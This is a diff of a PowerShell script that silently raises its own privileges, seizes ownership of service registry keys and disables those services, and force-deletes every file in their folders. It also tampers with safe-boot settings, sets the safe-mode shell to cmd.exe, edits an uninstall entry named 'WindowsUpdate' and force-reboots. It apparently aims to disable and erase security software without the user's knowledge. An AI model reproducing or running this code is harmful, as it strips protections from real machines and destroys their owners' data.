@@ -1,7 +1,8 @@
+& bcdedit.exe /deletevalue "{current}" safeboot > $null 2>&1;
+& bcdedit.exe /deletevalue "{current}" safebootalternateshell > $null 2>&1;
 $E="SilentlyContinue";$ErrorActionPreference=$E;
 Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class T{[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool AdjustTokenPrivileges(IntPtr h,bool d,ref L n,int l,IntPtr p,IntPtr r);[DllImport("kernel32.dll")]internal static extern IntPtr GetCurrentProcess();[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool OpenProcessToken(IntPtr h,int a,ref IntPtr p);[DllImport("advapi32.dll",SetLastError=true)]internal static extern bool LookupPrivilegeValue(string h,string n,ref long p);[StructLayout(LayoutKind.Sequential,Pack=1)]internal struct L{public int C;public long U;public int A;}public static void E(string p){try{L t=new L();IntPtr h=IntPtr.Zero;OpenProcessToken(GetCurrentProcess(),40,ref h);t.C=1;t.U=0;t.A=2;LookupPrivilegeValue(null,p,ref t.U);AdjustTokenPrivileges(h,false,ref t,0,IntPtr.Zero,IntPtr.Zero);}catch{}}}';
 try {
-    & bcdedit.exe /deletevalue "{current}" safeboot > $null 2>&1;
     [T]::E("SeTakeOwnershipPrivilege");
     [T]::E("SeRestorePrivilege");
     $S=New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544");
@@ -11,9 +12,12 @@ try {
         $p="HKLM:\SYSTEM\CurrentControlSet\Services\$s";
         if(Test-Path $p){
             try{
-                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","TakeOwnership");
+                $npc = [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree
+                $rto = [System.Security.AccessControl.RegistryRights]::TakeOwnership
+                $rcp = [System.Security.AccessControl.RegistryRights]::ChangePermissions
+                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),$npc,$rto);
                 $C=$K.GetAccessControl();$C.SetOwner($A);$K.SetAccessControl($C);$K.Close();
-                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),"ReadWriteSubTree","ChangePermissions");
+                $K=[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($p.Substring(6),$npc,$rcp);
                 $C=$K.GetAccessControl();$R=New-Object System.Security.AccessControl.RegistryAccessRule($A,"FullControl",3,"None","Allow");
                 $C.SetAccessRule($R);$K.SetAccessControl($C);$K.Close();
                 Set-ItemProperty -Path $p -Name "Start" -Value 4 -Type DWord -EA Stop;
@@ -26,7 +30,7 @@ try {
         $bd=Split-Path $tp;
         if (Test-Path $bd) {
             cmd.exe /c "takeown /F `"$bd`" /R /A /D Y >nul 2>&1";
-            cmd.exe /c "icacls `"$bd`" /grant Administrators:F /T /C /Q >nul 2>&1";
+            cmd.exe /c "icacls `"$bd`" /grant `${A}:F /T /C /Q >nul 2>&1";
             Get-ChildItem -Path $bd -File -Recurse | ForEach-Object { Remove-Item -Path $_.FullName -Force -EA $E; };
         }
     };
@@ -41,9 +45,9 @@ try {
 } catch {
 } finally {
     Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsUpdate" -Name "InstallDate" -EA $E;
-    $ksKey="HKLM:\SYSTEM\CurrentControlSet\Services\ksSvc";if(Test-Path $ksKey){Remove-Item -Path $ksKey -Force -Recurse -EA $E;};
-    $sbKey="HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ksSvc";if(Test-Path $sbKey){Remove-Item -Path $sbKey -Force -Recurse -EA $E;};
     & bcdedit.exe /deletevalue "{current}" safeboot > $null 2>&1;
+    & bcdedit.exe /deletevalue "{current}" safebootalternateshell > $null 2>&1;
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot" -Name "AlternateShell" -Value "cmd.exe" -Type String -EA $E;
     Restart-Computer -Force -ErrorAction SilentlyContinue;
     & shutdown.exe /r /t 0 /f > $null 2>&1;
 }
